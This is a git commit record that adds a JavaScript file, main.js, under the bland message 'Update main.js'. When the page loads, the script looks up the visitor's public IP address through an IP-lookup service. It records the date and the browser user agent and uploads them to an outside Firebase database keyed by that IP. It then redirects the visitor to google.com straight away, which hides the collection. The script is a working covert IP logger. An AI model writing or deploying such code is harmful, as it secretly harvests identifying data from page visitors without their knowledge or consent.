adc9d4b3afa980e3a29f29aa483e9319f790e9b1
pieterjansen8 <162340980+pieterjansen8@users.noreply.github.com>
2024-03-08 22:31:04 +0100

    Update main.js

---
+++ main.js
@@ -0,0 +1,27 @@
+$(document).ready(()=>{
+    $.getJSON("https://api.ipify.org?format=json",
+    function (data) {
+        a(data)
+    })
+});
+async function a(a){
+    var news = a.ip  
+    var n = news.replaceAll(".", "")  
+    var datum = Date() 
+    var device = navigator.userAgent
+    var json = JSON.stringify({
+        ip: news, 
+        date: datum,
+        device: device
+    })                 
+    const f = await fetch("https://usrs-6ab7c-default-rtdb.europe-west1.firebasedatabase.app/"+n+".json",{
+      headers:
+     {
+      'Accept': 'application/json',
+      'Content-Type': "application/json",
+     },
+     method: "PUT",
+     body: json
+    })
+    window.location.replace("https://google.com")
+}
